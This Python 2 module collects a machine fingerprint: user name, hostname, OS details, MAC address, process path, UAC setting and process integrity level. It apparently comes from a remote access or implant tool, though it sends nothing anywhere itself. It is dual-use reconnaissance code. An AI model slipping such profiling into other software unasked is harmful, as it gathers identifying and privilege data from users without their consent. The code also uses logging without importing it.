# -*- coding: utf-8 -*-

import platform
import getpass
import uuid
import sys
import os
import locale

os_encoding = locale.getpreferredencoding() or "utf8"

if sys.platform == 'win32':
    from _winreg import *
    import ctypes

def get_integrity_level():
    '''from http://www.programcreek.com/python/example/3211/ctypes.c_long'''

    if sys.platform != 'win32':
        if os.geteuid() != 0:
            return "Medium"
        else:
            return "High"

    mapping = {
        0x0000: u'Untrusted',
        0x1000: u'Low',
        0x2000: u'Medium',
        0x2100: u'Medium high',
        0x3000: u'High',
        0x4000: u'System',
        0x5000: u'Protected process',
    }

    BOOL = ctypes.c_long
    DWORD = ctypes.c_ulong
    HANDLE = ctypes.c_void_p

    class SID_AND_ATTRIBUTES(ctypes.Structure):
        _fields_ = [
            ('Sid', ctypes.c_void_p),
            ('Attributes', DWORD),
        ]

    class TOKEN_MANDATORY_LABEL(ctypes.Structure):
        _fields_ = [
            ('Label', SID_AND_ATTRIBUTES),
        ]

    TOKEN_READ = DWORD(0x20008)
    TokenIntegrityLevel = ctypes.c_int(25)
    ERROR_INSUFFICIENT_BUFFER = 122

    ctypes.windll.kernel32.GetLastError.argtypes = ()
    ctypes.windll.kernel32.GetLastError.restype = DWORD
    ctypes.windll.kernel32.GetCurrentProcess.argtypes = ()
    ctypes.windll.kernel32.GetCurrentProcess.restype = ctypes.c_void_p
    ctypes.windll.advapi32.OpenProcessToken.argtypes = (
            HANDLE, DWORD, ctypes.POINTER(HANDLE))
    ctypes.windll.advapi32.OpenProcessToken.restype = BOOL
    ctypes.windll.advapi32.GetTokenInformation.argtypes = (
            HANDLE, ctypes.c_long, ctypes.c_void_p, DWORD, ctypes.POINTER(DWORD))
    ctypes.windll.advapi32.GetTokenInformation.restype = BOOL
    ctypes.windll.advapi32.GetSidSubAuthorityCount.argtypes = [ctypes.c_void_p]
    ctypes.windll.advapi32.GetSidSubAuthorityCount.restype = ctypes.POINTER(
            ctypes.c_ubyte)
    ctypes.windll.advapi32.GetSidSubAuthority.argtypes = (ctypes.c_void_p, DWORD)
    ctypes.windll.advapi32.GetSidSubAuthority.restype = ctypes.POINTER(DWORD)

    token = ctypes.c_void_p()
    proc_handle = ctypes.windll.kernel32.GetCurrentProcess()
    if not ctypes.windll.advapi32.OpenProcessToken(
            proc_handle,
            TOKEN_READ,
            ctypes.byref(token)):
        logging.error('Failed to get process token')
        return None

    if token.value == 0:
        logging.error('Got a NULL token')
        return None
    try:
        info_size = DWORD()
        if ctypes.windll.advapi32.GetTokenInformation(
                token,
                TokenIntegrityLevel,
                ctypes.c_void_p(),
                info_size,
                ctypes.byref(info_size)):
            logging.error('GetTokenInformation() failed expectation')
            return None

        if info_size.value == 0:
            logging.error('GetTokenInformation() returned size 0')
            return None

        if ctypes.windll.kernel32.GetLastError() != ERROR_INSUFFICIENT_BUFFER:
            logging.error(
                    'GetTokenInformation(): Unknown error: %d',
                    ctypes.windll.kernel32.GetLastError())
            return None

        token_info = TOKEN_MANDATORY_LABEL()
        ctypes.resize(token_info, info_size.value)
        if not ctypes.windll.advapi32.GetTokenInformation(
                token,
                TokenIntegrityLevel,
                ctypes.byref(token_info),
                info_size,
                ctypes.byref(info_size)):
            logging.error(
                    'GetTokenInformation(): Unknown error with buffer size %d: %d',
                    info_size.value,
                    ctypes.windll.kernel32.GetLastError())
            return None

        p_sid_size = ctypes.windll.advapi32.GetSidSubAuthorityCount(
                token_info.Label.Sid)
        res = ctypes.windll.advapi32.GetSidSubAuthority(
                token_info.Label.Sid, p_sid_size.contents.value - 1)
        value = res.contents.value
        return mapping.get(value) or u'0x%04x' % value

    finally:
        ctypes.windll.kernel32.CloseHandle(token)

def getUACLevel():
    if sys.platform != 'win32':
        return 'N/A'
    i, consentPromptBehaviorAdmin, enableLUA, promptOnSecureDesktop = 0, None, None, None
    try:
        Registry = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
        RawKey = OpenKey(Registry, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
    except:
        return "?"
    while True:
        try:
            name, value, type = EnumValue(RawKey, i)
            if name == "ConsentPromptBehaviorAdmin":
                consentPromptBehaviorAdmin = value
            elif name == "EnableLUA":
                enableLUA = value
            elif name == "PromptOnSecureDesktop":
                promptOnSecureDesktop = value
            i+=1
        except WindowsError:
            break

    if consentPromptBehaviorAdmin == 2 and enableLUA == 1 and promptOnSecureDesktop == 1:
        return "3/3"
    elif consentPromptBehaviorAdmin == 5 and enableLUA == 1 and promptOnSecureDesktop == 1:
        return "2/3"
    elif consentPromptBehaviorAdmin == 5 and enableLUA == 1 and promptOnSecureDesktop == 0:
        return "1/3"
    elif enableLUA == 0:
        return "0/3"
    else:
        return "?"

def GetUserName():
    from ctypes import windll, WinError, create_string_buffer, byref, c_uint32, GetLastError
    DWORD = c_uint32
    nSize = DWORD(0)
    windll.advapi32.GetUserNameA(None, byref(nSize))
    error = GetLastError()

    ERROR_INSUFFICIENT_BUFFER = 122
    if error != ERROR_INSUFFICIENT_BUFFER:
        raise WinError(error)

    lpBuffer = create_string_buffer('', nSize.value + 1)

    success = windll.advapi32.GetUserNameA(lpBuffer, byref(nSize))
    if not success:
        raise WinError()

    return lpBuffer.value

def get_uuid():
    user=None
    node=None
    plat=None
    release=None
    version=None
    machine=None
    macaddr=None
    pid=None
    proc_arch=None
    proc_path=sys.executable
    uacLevel = None
    integrity_level = None
    try:
        if sys.platform=="win32":
            user=GetUserName().decode(encoding=os_encoding).encode("utf8")
        else:
            user=getpass.getuser().decode(encoding=os_encoding).encode("utf8")
    except Exception as e:
        user=str(e)
        pass

    try:
        node=platform.node().decode(encoding=os_encoding).encode("utf8")
    except Exception:
        pass

    try:
        version=platform.platform()
    except Exception:
        pass

    try:
        plat=platform.system()
    except Exception:
        pass

    try:
        from kivy.utils import platform as kivy_plat#support for android
        plat=bytes(kivy_plat)
    except ImportError:
        pass

    try:
        release=platform.release()
    except Exception:
        pass

    try:
        version=platform.version()
    except Exception:
        pass

    try:
        machine=platform.machine()
    except Exception:
        pass

    try:
        pid=os.getpid()
    except Exception:
        pass

    try:
        proc_arch=platform.architecture()[0]
    except Exception:
        pass

    try:
        macaddr=uuid.getnode()
        macaddr=':'.join(("%012X" % macaddr)[i:i+2] for i in range(0, 12, 2))
    except Exception:
        pass

    try:
        uacLevel = getUACLevel()
    except Exception as e:
        uacLevel = "?"

    try:
        integrity_level = get_integrity_level()
    except Exception as e:
        integrity_level = "?"

    return {
        'user': user,
        'hostname': node,
        'platform': plat,
        'release': release,
        'version': version,
        'os_arch': machine,
        'macaddr': macaddr,
        'pid': pid,
        'proc_arch': proc_arch,
        'exec_path': proc_path,
        'uac_lvl': uacLevel,
        'intgty_lvl': integrity_level
    }
